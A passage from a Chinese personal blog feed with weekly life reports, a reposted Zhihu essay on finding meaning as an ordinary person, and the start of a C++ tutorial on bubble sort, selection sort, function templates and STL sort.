start="2"><li>来自《千与千寻》</li></ol><p>不管前方的路有多苦，只要走的方向正确，都比站在原地更接近幸福。</p><ol start="3"><li>最清晰的脚印，踩在最泥泞的路上。</li><li>无论风暴将我带到什么岸边，我都将以主人的身份上岸。</li><li>自律且努力，别让生活太安逸。</li><li>不要因为走得太快，而忘记为什么出发。–纪伯伦</li><li>满怀希望就会所向披靡。</li><li>不做准备，就是在准备失败。–富兰克林</li><li>生活，就是昂首前瞻。</li><li>感恩努力每个追寻的瞬间，我们找到彼此也和自己相认。</li></ol><p>​</p><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><ol><li>pitch–好看简洁的在线 ppt 制作网站</li><li><a href="https://www.cnblogs.com/llfy/p/9405120.html">堆和栈的区别</a></li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>无论人生上到哪一层台阶，阶下有人在仰望你，阶上亦有人在俯视你。你抬头自卑，低头自得，唯有平视，才能看见真正的自己。</li><li>愿你的未来纯净明朗，像你此刻可爱的目光。在世间美好的命运中，愿你的命运美好欢畅。</li></ol>]]></content>
    
    
    <categories>
      
      <category>周报</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>一个平凡人的自述</title>
    <link href="/2021/07/11/%E4%B8%80%E4%B8%AA%E5%B9%B3%E5%87%A1%E4%BA%BA%E7%9A%84%E8%87%AA%E8%BF%B0_new/"/>
    <url>/2021/07/11/%E4%B8%80%E4%B8%AA%E5%B9%B3%E5%87%A1%E4%BA%BA%E7%9A%84%E8%87%AA%E8%BF%B0_new/</url>
    
    <content type="html"><![CDATA[<p>tags: [知乎]<br>categories: [随笔]<br>index_img: “<a href="https://image.hackerjerry.top/dddd-3.jpg&quot;">https://image.hackerjerry.top/dddd-3.jpg&quot;</a><br>​</p><hr><p><strong>一个平凡人，活着的意义是什么呢？</strong></p><p>我没有很好的外表，也没有可以挥霍的资本，从小到大一直都普普通通。<br>​</p><p>在人前一般都很安静，给人看起来不善言谈的样子。个人很独立，自己的事情尽量自己完成。从不主动去和异性搭话或是帮忙，也很少去表现自己，在人群中永远都是小透明。<br>​</p><p>消息总是群聊、公众号发来的信息，时常觉得是自己做的不够好，长得不好看。内心很敏感，有时别人一句无心的话，可能会使自己郁闷一整天。<br>​</p><p>和别人说话总是很温柔，难过的事情自己扛，不太希望别人干扰我的生活，听歌听一晚、睡起来还是新的一天。在灯火通明的夜里，无聊的看星星和月亮落下，每天都是循环如此。<br>​</p><p>每当有人问起，为什么我不恋爱的时候，我总以麻烦为理由搪塞过去。<br>​</p><p>朋友和我说，或许是你还没遇见真正喜欢的人吧，我却没法开口告诉他们。其实我遇见过，只是遇见得过早，以至于我还没来得及弄清楚，就弄丢了。<br>​</p><p>在二十多年的平淡日子里，既没能成为自己的月亮，又一事无成，惊艳不了谁的岁月。<br>​</p><p>那么平凡的我，活着的意义是什么？<br>​</p><p>日你妈，我偏爱自己骨子里的那份冷清，生性安静，但也孤傲，遵从自己的内心。<br>​</p><p>我脚下的影子从来不肯试着像谁，直抒胸臆我也不曾受谁气受。<br>​</p><p><strong>我对美好生活的向往，就是我活着的意义。</strong><br>​</p><p>我想努努力，赚点小钱，然后实现经济独立，去做些自己想做的事。</p><p>去爬一次雪山，去感受千山鸟飞绝，万径人踪灭。去感受自然的伟大和雄伟瑰丽，去挑战自我。<br>​</p><p>去草原骑一次大马，看野花被风吹起，牛羊奔息，草原就像是落了一场急雨。草叶翻滚，踩上去就会有咯吱咯吱的淅沥与轻柔。<br>​</p><p>去边远的乡村旅行。傍晚的风很轻，天空挂着洁白的云，在小镇古朴的石桥上，牵着大狗儿慢悠悠地走在落日的大道。<br>​</p><p>我还想去写故乡的月亮，弥补对家人的亏欠，为自己不懂事的过往道歉，原谅自己人生的缺憾。<br>​</p><p>那时的天空很蓝很近，晚霞晕染在天边，村庄散出一圈又一圈的白烟。我和女孩站在长满栗子的老树下，轻轻地敲打着秋天。<br>​</p><p>我现在想去遇见能分享心情的人。看月光淡淡地爬上树梢，抓住平淡日子里的小确幸，在心里种下一株向阳而生的花儿，比一切美酒都要芬芳。<br>​</p><p>有人问一个平庸的人，活着的意义是什么？其实无论多么波澜壮阔的生命，最终都要归于平淡的柴米油盐与尘土，我感谢自己卑微而鲜活地活着。<br>​</p><p>有人说活着很累，其实吧，我也没吃过什么生活的苦。此生有幸，受家人疼爱，朋友照顾，而我不快乐的原因多数只是自己放大了，一些人生中的小挫折失败罢了。<br>​</p><p>生活中总会有很多平常的快乐可以沉溺其中。比如每天吃到的好吃东西，与朋友分享的有趣片段；洗完了积攒许久的衣服，收获来自陌生人的夸赞与关心；在温柔的日落下，去小区楼下喂养流浪的小猫，任其在怀里撒泼打滚。<br>​</p><p>生活本就由零散的碎片组成，有时鸡飞狗跳，有时轻松欢愉。如果愿意用最细腻的情感，去体验那些包裹在烟火里的平凡琐碎，就会从中收获到新的柔软与感动。如果感到不快乐的时候，可能只是我们把重心放错了地方，不必在一件事上停留太久。<br>​</p><p><strong>生活原本苦闷，但跑起来就会生风。</strong><br><strong>​</strong></p><blockquote><p>这是知乎答主<a href="https://www.zhihu.com/people/you-nei-han-de-shi-ni-yao-a">吹面不寒</a>的一篇回答，我很喜欢，这世界有很多相似的人，虽然成长的环境各不相同，但却塑造成了相似的人，我从他的回答里看到了自己的影子，可以说世另我！<br>所以说，像我们这样平凡的人，既然并不出色，那么就把手里的事情做好，就够了。既然成为不了别人的月亮，也温柔不了别人的时光，那么就好好的爱自己，好好的爱家人，对朋友也真心付出，好好的健身，去提升自己，无论内在或者外在。<br>追逐日月，不苟于山川。</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>生活周报-June-28-to-July-4</title>
    <link href="/2021/07/02/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-28-to-July-4_new/"/>
    <url>/2021/07/02/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-28-to-July-4_new/</url>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>7 月 1 日，中国共产党百年华诞。</li><li>中国男足进入世界杯亚洲 12 强</li></ol><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>期末考试结束。</li><li>暑期复习开始。</li><li>西安大雨，又一次落汤鸡。</li><li>西交的优营没拿到，入 66 就给了 15 个，真醉了。</li><li>开始早起健身，不碰手机，杜绝流视频平台（包括 b 站，好友热播等），不看 qq 动态。</li><li>开始 12 点之前上床，上床前定好闹钟，上床不看手机。</li><li>​</li></ol><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><p>【1】：<a href="https://mp.weixin.qq.com/s/Ic70dj7FSmDHGKTsekjhGQ">Kerberos 协议相关安全问题分析与利用</a><br>【2】：<a href="https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==%E2%88%A3=2247497760&idx=1&sn=4c0f57ba9203cc115a85cd0c011fdc43&chksm=ec1cad1fdb6b2409ec3ef25008ad6834a7220997a914308a478ed9d682c84c7b370e423a878c&scene=21#wechat_redirect">Kerberos 协议与 Kerberos 认证原理</a><br>【3】：<a href="https://mp.weixin.qq.com/s/_aeUWSfK4Igi_dAAJlvEww">隐秘的印记：暗水印实践技术分享</a><br>【4】：<a href="https://mp.weixin.qq.com/s/aIIP4qjtkGd1Houaq0cpdw">使用 Caronte 在 CTF 比赛中完成网络流量分析</a><br>《自控力》–节省决策成本</p><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><p>追了哪些剧？</p><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><ol><li>你若在场，看着繁华盛世，多好。</li></ol><p><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-28-to-July-4-1.jpeg#clientId=ue0601b88-cb5c-4&from=drop&height=347&id=u8745ea97&margin=%5Bobject%20Object%5D&name=1625225828093.jpg&originHeight=1080&originWidth=2400&originalType=binary%E2%88%B6=1&size=327540&status=done&style=none&taskId=uba156795-0383-4e11-9261-6891a96e69a&width=772" alt="1625225828093.jpg"></p><ol start="2"><li>万事藏于心而不表于情，花开两朵，天各一方，追赶日月，不苟于山川。</li><li>世态人情，可当书读，可当戏看，有缘无份，好聚好散。</li><li><strong>今天我请客，请你快乐</strong>。</li><li>那些你做了所有努力也没有在一起的人，都不是对的人。</li><li>道德是用来律己的，不是用来责人的。道德是用来躬行实践的，不是在嘴里头空喊的。–李大钊</li><li>我知道月光不会为我停留，也知道夏风永远短暂，可我仍会为那零星光亮奋力奔跑。</li><li>如今的社会风气啊，越来越苟且敷衍，只顾眼前，道德伦丧、败坏德行的事情，触目皆是，不是德行根基牢固的人，少有不被这种社会风气所污染。各位，国家的兴衰，要看社会风气是高尚还是低劣，如果都流行于这种社会风气，前途不堪设想，所以要有卓越之人，以身作则，尽力去矫正这种颓废的社会风气。<strong>诸君皆为大学学生，地位甚高，肩此重任，责无旁贷。如果德不修、学不讲，还与这种颓废的社会风气同流合污，那亦是侮辱自己，更何谈，做他人的榜样呢</strong>？所以，<strong>品行不可以不严谨对待和修养</strong>，这是我希望于诸君者之二。——蔡元培</li></ol><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><h3 id="健身"><a href="#健身" class="headerlink" title="健身"></a>健身</h3><blockquote><p>来自过来人的建议–从 125 斤到 165 斤</p></blockquote><ol><li>坚持，做任何事情都要坚持，健身也不例外。</li><li>一定要学好基础动作。</li><li>统计数据。吃了多少蛋白质，训练动作做了多重次数多少，肌肉酸疼感觉。</li><li>休息一定要安排好。</li><li>训练复盘<blockquote><p>关于饮食</p></blockquote></li></ol><p>碳水：蛋白质：油脂=6：3：1<br>一周三到四练，以三大项为主，先练大肌肉群，用大重量。肩和手臂用小重量多次，保证动作质量。（每天 30 分钟左右）<br>什么样的碳水呢？<br>米饭、玉米、土豆、馒头、面包等</p><blockquote><p>越跑肉掉的越多，有氧运动消耗太大。</p></blockquote><h3 id="摄影"><a href="#摄影" class="headerlink" title="摄影"></a>摄影</h3><p>新关注了一个 up 主，用的索尼 6400，配的适马 2000</p><h3 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h3><p><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-28-to-July-4-2.jpeg#clientId=ue0601b88-cb5c-4&from=drop&height=960&id=u2ba33ffe&margin=%5Bobject%20Object%5D&name=1625226567307.jpg&originHeight=2400&originWidth=1080&originalType=binary%E2%88%B6=1&size=516869&status=done&style=none&taskId=u4ec4a1b9-ac12-467c-b283-d5d7f5e5c1b&width=432" alt="1625226567307.jpg"></p><ol><li>练就有神眼睛</li><li>如何以尽可能低的价钱买东西？</li></ol><p><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-28-to-July-4-3.jpeg#clientId=ue0601b88-cb5c-4&from=drop&height=1089&id=u821bc7fd&margin=%5Bobject%20Object%5D&name=1625226731433.jpg&originHeight=2400&originWidth=1080&originalType=binary%E2%88%B6=1&size=544277&status=done&style=none&taskId=u7cb492fc-4d99-4228-a464-fefb2b8c445&width=490" alt="1625226731433.jpg"></p><ol start="3"><li>填什么东西，申请表之类的，交上之前拍照或者复制一份在手里，以备不时之需。</li><li>学会说话</li></ol><p>把“谢谢”改成“<strong>谢谢你</strong>”<br>把“随便”改成“<strong>听你的</strong>”<br>把“听明白了吗”改成“<strong>我说明白了吗</strong>”<br>把“我尽量”改成“<strong>我全力以赴</strong>”</p><ol start="5"><li><strong>最困难的事情，在早晨完成，不要第一时间看手机！</strong></li><li>如何养成良好的坐姿</li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>关于为何没有拿到西交的优秀营员，我回想了一下，应该是回答踩雷太多了。</li><li>酒后吐真言未必是真的，只是他想让你这么相信罢了，具体还是要看他干了什么事。</li><li>你付出信任，就会收获信任；你给出赞美，就会收获支持。生命，是一种回声。</li><li>关于认清自己，学姐是这么说的：<strong>静下心来，整理自己所获得的成就，回顾自己以往的失败案例，去对比，去排除。</strong></li></ol><p><strong>​</strong></p><p><strong>我们始终在认识自己的道路上前进，这条路不太好走，迷雾很多，干扰也有很多，稍不留神，我们就迷失了。</strong><br><strong>​</strong></p><p><strong>但是我们应该做的，就是要认清自己想要什么，自己正在干什么，自己还有哪些不足要去弥补，就够了。人无完人，不必陷入对他人的焦虑之中，面对自己，每天进步，无愧于心就好。</strong></p><ol start="5"><li>关于做学问和读书，觉醒年代中是这么说的：</li></ol><p><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-28-to-July-4-4.jpeg#clientId=ue0601b88-cb5c-4&from=drop&id=u94f210ad&margin=%5Bobject%20Object%5D&name=N7536JW%29%404DFBR5S7M92%7BOA.jpg&originHeight=965&originWidth=720&originalType=binary%E2%88%B6=1&size=102821&status=done&style=none&taskId=uc64ab375-fe33-44cb-af56-dc3efbdbce1" alt="N7536JW)@4DFBR5S7M92{OA.jpg"><br>​</p><p>百年前，北大学子中是这样对待学问的，“平时冶游，考试来了，才去翻读讲义”“不问学术之有无，唯争分数之多寡，考试结束，书籍束之高阁，毫不过问。”如今的我们，似乎并无二致。平日上课，草草应付，课前预习、课后复习的好习惯早已抛掷脑后，临了考试，靠老师的重点过活，力求高分，卷绩点，却没有将知识的深度延伸，考完再不过问，何谈科教兴邦，何谈科教兴国，培养出一群只会考试的人，如何学以致用，弥补差距？</p><ol start="6"><li>来自教员年轻的时候说的话：<strong>这是一个浮躁的社会，只有自律的人，才有可能脱颖而出，成就大事。</strong></li></ol><p>教员在天之灵，看到这锦绣山河，想必也会欣慰的。<br><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-28-to-July-4-5.jpeg#clientId=ue0601b88-cb5c-4&from=drop&id=uda969225&margin=%5Bobject%20Object%5D&name=1625225893756.jpg&originHeight=1079&originWidth=720&originalType=binary%E2%88%B6=1&size=73415&status=done&style=none&taskId=u72567956-30d5-4e5b-9f3e-4ffe4896e22" alt="1625225893756.jpg"><br>​</p><p>生逢盛世，我辈有幸迎接中国共产党百年华诞。回首来路，何其艰辛，何其波澜壮阔，何其光华璀璨。中国共产党人一直把为中国人民谋幸福，为中华民族谋复兴作为自己的初心和使命，不畏艰险，不畏牺牲，百折不挠。是中国共产党带领中国人民创造了新民主主义革命的伟大成就，是中国共产党带领中国人民推翻了帝国主义、封建主义、官僚资本主义三座大山，是中国共产党带领中国人民建立了人民当家作主的中华人民共和国。<br>​</p><p>为了实现中华民族的伟大复兴，中国共产党人代代接力，书写奇迹。从一穷二白的小农经济，到充满活力的市场经济体制，中国取得了全面小康的伟大成绩。从第一部社会主义宪法的颁布，再到建成较为完善的社会主义法律法规体系，社会主义没有辜负中国，中国也没有辜负社会主义！<br>​</p><p>百年长路，感慨万千。一百年来，无数的中国共产党人坚守理想担当，坚守初心使命，为中华民族、中国人民做出不可磨灭的贡献，他们为祖国和民族建立的丰功伟绩将永载史册，他们为人民创造的辉煌成就将流芳百世。<br>​</p><p>何其有幸，我们生在红旗下，长在春风里。<br>​</p><p>请党放心，强国有我！<br>​</p><p>![F4GS34SAG7JKNC<del>L62G`3</del>5.jpg](<a href="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-28-to-July-4-6.jpeg#clientId=ue0601b88-cb5c-4&amp;from=drop&amp;id=u7d6e35df&amp;margin=%5Bobject%20Object%5D&amp;name=F4GS34SAG7JKNC~L62G%603~5.jpg&amp;originHeight=909&amp;originWidth=720&amp;originalType=binary%E2%88%B6=1&amp;size=103712&amp;status=done&amp;style=none&amp;taskId=u3006c74d-22cc-4600-86bb-1ffb72cf71b">https://image.hackerjerry.top/生活周报-June-28-to-July-4-6.jpeg#clientId=ue0601b88-cb5c-4&amp;from=drop&amp;id=u7d6e35df&amp;margin=%5Bobject%20Object%5D&amp;name=F4GS34SAG7JKNC~L62G%603~5.jpg&amp;originHeight=909&amp;originWidth=720&amp;originalType=binary∶=1&amp;size=103712&amp;status=done&amp;style=none&amp;taskId=u3006c74d-22cc-4600-86bb-1ffb72cf71b</a>)</p>]]></content>
    
    
    <categories>
      
      <category>周报</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>排序</title>
    <link href="/2021/06/18/%E6%8E%92%E5%BA%8F_new/"/>
    <url>/2021/06/18/%E6%8E%92%E5%BA%8F_new/</url>
    
    <content type="html"><![CDATA[<p>把各类排序做一遍梳理。</p><a id="more"></a><h1 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//bubble sort</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sort</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num[])</span></span>&#123;<br>    <span class="hljs-keyword">int</span> length = <span class="hljs-keyword">sizeof</span>(num)/<span class="hljs-keyword">sizeof</span>(num[<span class="hljs-number">0</span>]);<span class="hljs-comment">//获取数组长度</span><br>    <span class="hljs-keyword">int</span> temp;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i  = <span class="hljs-number">0</span>;i &lt; length<span class="hljs-number">-1</span>; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j&lt; length<span class="hljs-number">-1</span>-i; j++)&#123;<span class="hljs-comment">//注意这里，每一轮j比前一轮到达的位置递减</span><br>            <span class="hljs-keyword">if</span>(num[j] &gt; num[j+<span class="hljs-number">1</span>])&#123;<br>                temp = num[j];<br>                num[j] = num[j+<span class="hljs-number">1</span>];<br>                num[j+<span class="hljs-number">1</span>] = temp;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>双层循环，时间复杂度是 O(n2)。</p><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p><strong>比如说给你一个有序的数组，或者是部分有序的数组，你怎么把它的运行时间降下来</strong><br>我们可以设置一个标记位，如果在某一轮中从来没有交换过前后两个数，我们认为此时就已经有序了，没必要再进行之后的循环了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> length = <span class="hljs-keyword">sizeof</span>(num)/<span class="hljs-keyword">sizeof</span>(num[<span class="hljs-number">0</span>]);<span class="hljs-comment">//注意，计算数组长度必须要在main函数里面，而不能将num做参数传递之后再计算。</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">OptimizeSort</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num[],<span class="hljs-keyword">int</span> length)</span></span>&#123;<br>    <span class="hljs-keyword">int</span> temp;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; length - <span class="hljs-number">1</span> ; i++)&#123;<br>        <span class="hljs-keyword">bool</span> flag = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; length - <span class="hljs-number">1</span> -i; j++)&#123;<br>            <span class="hljs-keyword">if</span>(num[j] &gt; num[j+<span class="hljs-number">1</span>])&#123;<br>                temp = num[j];<br>                num[j] = num[j+<span class="hljs-number">1</span>];<br>                num[j+<span class="hljs-number">1</span>] = temp;<br>                flag = <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>          <span class="hljs-keyword">if</span>(flag)&#123;<span class="hljs-comment">//经过一轮后，flag标志没有改变，说明有序，可以退出循环</span><br>              <span class="hljs-keyword">break</span>;<br>          &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当将数组作为实参传递到另一个函数中时, 另一个函数的形参相当于一个指针变量, 因为将数组的名作为实参时, 就是<strong>将数字的首地址作为实参</strong>, 所以在 test 函数中输出的<strong>sizeof(arr)其实得到的是一个整型数组指针的长度</strong>(所占的字节数), 所以结果是 8, 再用其除以 int 所占的字节数(4), 结果就是 2。ps：这里 sizeof(&amp;arr)=8，sizeof(arr)=实际长度*4<br>要想用函数计算数组的长度，可以使用函数模板。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">count</span><span class="hljs-params">(T&amp; x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> s1 = <span class="hljs-keyword">sizeof</span>(x);<br>    <span class="hljs-keyword">int</span> s2 = <span class="hljs-keyword">sizeof</span>(x[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">int</span> result = s1 / s2;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> a[] = &#123; <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> &#125;;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; count(a);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>为什么可以呢？首先我们需要知道函数模板是什么。</p><h3 id="函数模板"><a href="#函数模板" class="headerlink" title="函数模板"></a>函数模板</h3><p><strong>函数模板不是一个实在的函数，编译器不能为其生成可执行代码。定义函数模板后只是一个对函数功能框架的描述，当它具体执行时，将根据传递的实际参数决定其功能。</strong><br>C++ 语言支持模板。有了模板，可以只写一个 Swap 模板，编译器会根据 Swap 模板自动生成多个 Sawp 函数，用以交换不同类型变量的值。<br>函数模板的写法如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> 类型参数1, <span class="hljs-title">class</span>类型参数2, ...&gt;</span><br><span class="hljs-class">返回值类型  模板名(形参表)</span><br><span class="hljs-class">&#123;</span><br>    函数体<br>&#125;<br></code></pre></td></tr></table></figure><p>具体示例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-class"><span class="hljs-title">void</span> <span class="hljs-title">Swap</span>(<span class="hljs-title">T</span> &amp; <span class="hljs-title">x</span>, <span class="hljs-title">T</span> &amp; <span class="hljs-title">y</span>)</span><br><span class="hljs-class">&#123;</span><br>    T tmp = x;<br>    x = y;<br>    y = tmp;<br>&#125;<br></code></pre></td></tr></table></figure><p>就像这样，它用 T 代替了普通函数定义中的数据类型，代表一种泛化类型。<br>T 是类型参数，代表类型。<br>编译器由模板自动生成函数时，会用具体的类型名对模板中所有的类型参数进行替换，其他部分则原封不动地保留。同一个类型参数只能替换为同一种类型。编译器在编译到调用函数模板的语句时，会根据实参的类型判断该如何替换模板中的类型参数。</p><h1 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h1><p>首先，找到数组中最小的元素，拎出来，将它和数组的第一个元素交换位置，第二步，在剩下的元素中继续寻找最小的元素，拎出来，和数组的第二个元素交换位置，如此循环，直到整个数组排序完成。<br><img src="https://image.hackerjerry.top/%E6%8E%92%E5%BA%8F-1.gif#height=387&id=u26cb77fa&margin=%5Bobject%20Object%5D&originHeight=538&originWidth=955&originalType=binary%E2%88%B6=1&status=done&style=none&width=687"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-keyword">int</span> length = <span class="hljs-keyword">sizeof</span>(num)/<span class="hljs-keyword">sizeof</span>(num[<span class="hljs-number">0</span>]);<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SelectSort</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num[],<span class="hljs-keyword">int</span> length)</span></span>&#123;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i &lt; length;i++)&#123;<br>        <span class="hljs-keyword">int</span> min = i;<span class="hljs-comment">//只需要记录最小值的位置即可！</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = i+<span class="hljs-number">1</span>; j &lt; length;j++)&#123;<br>            <span class="hljs-keyword">if</span> (num[min] &gt; num[j])&#123;<br>                min = j;<span class="hljs-comment">//更新最小位置</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(i!=min)&#123;<br>            <span class="hljs-keyword">int</span> temp = num[min];<br>            num[min] = num[i];<br>            num[i] = temp;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>双层循环，时间复杂度和冒泡一模一样，都是 O(n2)。</p><p>#</p><h1 id="STL-库函数-sort"><a href="#STL-库函数-sort" class="headerlink" title="STL 库函数 sort"></a>STL 库函数 sort</h1><p>编写 C++经常需要使用 sort 进行排序，有可能是简单的数组、数字 vector 或者是复杂一点的存放对象的 vector。<br>C++为了满足用户的需求，在 algorithm 里面封装了 sort 泛型算法。所以使用时，必须<code>#include &lt; algorithm&gt;</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RandomAccessIterator</span>&gt;</span><br><span class="hljs-class"><span class="hljs-title">void</span> <span class="hljs-title">sort</span> (<span class="hljs-title">RandomAccessIterator</span> <span class="hljs-title">first</span>, <span class="hljs-title">RandomAccessIterator</span> <span class="hljs-title">last</span>);</span><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RandomAccessIterator</span>, <span class="hljs-title">class</span> <span class="hljs-title">Compare</span>&gt;</span><br><span class="hljs-class"><span class="hljs-title">void</span> <span class="hljs-title">sort</span> (<span class="hljs-title">RandomAccessIterator</span> <span class="hljs-title">first</span>, <span class="hljs-title">RandomAccessIterator</span> <span class="hljs-title">last</span>, <span class="hljs-title">Compare</span> <span class="hljs-title">comp</span>);</span><br></code></pre></td></tr></table></figure><p>可以看见，sort 原型分为两个，区别在于第一个函数有两个参数，第一个函数有三个参数。<br>其中两个函数都有的是 <code>RandomAccessIterator</code> 是随机访问迭代器，first 是初始位置，last 是末尾位置，默认使用迭代器引用的 <code>operator &lt; </code>进行排序。<br>第二个函数，前两个参数一样，也是用来说明从哪儿到哪儿排序。第三个参数是<code>Compare</code>，意思是使用 comp 这个“方法”对对象进行排序。<code>comp</code>可以是函数对象或者是函数指针。</p><h2 id="默认情况"><a href="#默认情况" class="headerlink" title="默认情况"></a>默认情况</h2><ul><li>两个参数</li></ul><p>使用两个参数这应该是最普遍也是最简单的情景，如果只有两个参数，默认使用 operator &lt; 对数组排序，结果为<strong>升序</strong>。</p><h3 id="对数组排序"><a href="#对数组排序" 